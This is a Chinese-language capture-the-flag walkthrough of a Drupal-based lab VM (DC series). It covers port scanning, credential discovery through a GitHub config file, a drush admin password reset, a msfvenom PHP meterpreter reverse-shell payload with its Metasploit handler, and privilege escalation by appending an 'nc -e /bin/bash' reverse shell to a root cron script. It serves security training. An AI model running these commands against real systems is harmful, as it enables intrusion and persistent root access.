
# 0x00环境

攻击机：kali：192.168.1.28

靶机DC-1：192.168.1.15


# 0x01实战


## 端口扫描

```
nmap -sV -A 192.168.1.15
```

![image-20220112141640627.png](./assets/1652256667703-f7390db6-c819-4d76-9765-67b3fa6eef05.png)

可以看到开放了22号端口SSH服务和80端口HTTP服务


## 漏洞发现

访问HTTP服务，主页提示我们`这个挑战并不完全是技术性的，但如果您需要诉诸暴力破解或字典攻击，您可能不会成功`

![image-20220112142045739.png](./assets/1652256672497-686e8dc8-f3ec-4198-9315-81d0eaccbeff.png)

查看登陆页面，登录页面显示要求我们输入 D7 用户名

![image-20220112142538255.png](./assets/1652256676271-b703cf20-bf5e-4994-9850-1c4b3bd9a006.png)

在首页的左下方发现一个类似于用户名的东西，熟悉twitter的就会发现这个名字类似twitter的账号

![image-20220112143946107.png](./assets/1652256817750-08954e9e-933b-4dd0-89aa-fb6305ada3be.png)

![image-20220112142712234.png](./assets/1652256822692-0bcf85bf-5407-4702-9d7e-281fbd170a81.png)

在twitter上搜索该账号，可以得到一各github地址

![image-20220112143505707.png](./assets/1652256831029-ca7b81f4-f2d5-4cb4-a37f-731042573c9f.png)

访问github地址，一番浏览中发现在config.php文件中暴露账户和密码

![image-20220112144310546.png](./assets/1652256845352-0d4dc144-d9ab-4c43-906d-395c89b80e78.png)

使用账号和密码登录后台，登陆失败

![image-20220112144426204.png](./assets/1652256864107-178524d6-a403-4896-b0df-1468ff1ae219.png)

在前面的端口扫描中我们发现开放了22号端口SSH服务，尝试链接

![image-20220112144548593.png](./assets/1652256868225-5ebbc73e-1efc-4709-a1eb-223305118868.png)

成功登录

正当一筹莫展的时候终端显示收到一封邮件，那就去查看一下吧

![image-20220112154314646.png](./assets/1652256888994-85968f1a-3633-4f65-bbd0-45e6a6b37ef8.png)

在邮件中查看到`/opt/scripts/backups.sh`脚本文件，而且仔细观察可以发现邮件是间隔15min发一次的，也就是说backups.sh脚本文件15min分钟运行一次。

查看backups.sh脚本文件权限和内容（养成习惯看见脚本文件就查看权限，会有意想不到的收获）

![image-20220112153838739.png](./assets/1652256897607-8bc8853b-49cf-41df-a9f1-e0d61086b2ce.png)

可以看到backups.sh脚本文件以root和www-data运行在同一组中

查看脚本文件

![image-20220112145537851.png](./assets/1652256908427-2f63cfd5-ec5c-4c29-853c-3c903a6650b8.png)

在脚本文件中发现了drush命令，百度一下

![image-20220112150122428.png](./assets/1652256930208-84286e23-884a-48ff-8052-6574d405214f.png)

drush命令可以修改用户密码，而drupalCMS默认存在admin账户，修改admin账户的密码

```
cd /var/www/html/
drush user-password  admin --password=123456
```

![image-20220112150454179.png](./assets/1652256935258-1bd12e57-50bf-4561-ad44-0c9c25966225.png)

登陆后台，成功

![image-20220112150554204.png](./assets/1652256939459-b2a799b1-74b2-43df-ba8c-8baacf84a2c7.png)


## 反弹shell

在后台发现我们可以新建页面

![image-20220112150813405.png](./assets/1652256944462-e20b9481-a7c2-4991-a0c3-041b5ca61436.png)

但是不支持php

![image-20220112150844026.png](./assets/1652256949287-89a9dc1e-145b-46f5-968c-5e3f63d441fb.png)

通过Drupal官网我了解到可以安装PHP代码的插件，使其支持php代码

[https://www.drupal.org/project/php/releases/8.x-1.1](https://www.drupal.org/project/php/releases/8.x-1.1)

![image-20220112151337520.png](./assets/1652256952869-f5d5c996-b948-4211-9146-56cea15637dc.png)

安装php插件

![image-20220112151450761.png](./assets/1652256956595-a198027a-5e6a-49f9-b748-66b15c887c59.png)

安装后激活模块

![image-20220112151756543.png](./assets/1652256960422-e65f52a4-25ab-4037-81b2-c501773e9591.png)

![image-20220112151902936.png](./assets/1652256963973-40c0d683-2931-4c0d-95b5-383d29f91ae6.png)

创建木马

```
msfvenom -p php/meterpreter/reverse_tcp  lhost=192.168.1.28 port=4444 -f raw
```

![image-20220112152106345.png](./assets/1652256979114-eef7233e-ddb9-4315-871a-c2d54fb83c5d.png)

在后台创建木马文件

![image-20220112152244204.png](./assets/1652256983087-1d90ea11-c978-4f8d-9d0c-0d38fa36fd22.png)

![image-20220112152322718.png](./assets/1652256987493-8530d371-3cac-4ae7-952a-11bf205c4d12.png)

创建监听

```
┌──(root💀kali)-[~]
└─# msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.1.28
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > run
```

![image-20220112152451900.png](./assets/1652256992204-b4d5d73c-4bf3-4eb3-a10c-dfe1ff31dcde.png)

访问XMTX

![image-20220112152628533.png](./assets/1652256996501-deaf9f89-288b-4506-9fb8-4035c5b76336.png)

成功反弹shell

![image-20220112152650729.png](./assets/1652257000288-d0e28b61-748e-4322-b2d4-f76e6e759379.png)


## 提权

查看系统版本

```
cat /proc/version
cat /etc/issue
```

![image-20220112153251189.png](./assets/1652257004533-e6d7787f-3e79-4d1f-b530-250d31400d21.png)

在这里我感觉到了嘲讽`Please enjoy your stay(祝你在这停留的愉快)`根据这句话多半不可能是在这里提权了。

在前面我们看到backups.sh脚本文件以root和www-data运行在同一组中，并且backups.sh脚本15min运行一次。我们现在是www-data权限可以对backups.sh脚本进行操作，如果向backups.sh脚本写入恶意代码，当backups.sh脚本以root身份运行时我们就可以得到root权限。

设置监听

![image-20220112155007689.png](./assets/1652257017078-0567df0f-d42c-4e37-b637-cd3b0b37988e.png)

写入恶意代码

```
echo nc 192.168.1.28 12345 -e /bin/bash >> /opt/scripts/backups.sh
```

![image-20220112155129464.png](./assets/1652257021575-5dd51b29-9192-491a-a5c3-58f64c97ccca.png)

接下来就是等待脚本运行了（最多15min），成功反弹

![image-20220112160114748.png](./assets/1652257036311-d2ff6df4-7ac3-4c2d-903b-e08f2bef431d.png)


## final-flag

在root根目录下找到final-flag

![image-20220112160238050.png](./assets/1652257042254-2d40aab5-beee-484a-abc2-e9462c649555.png)
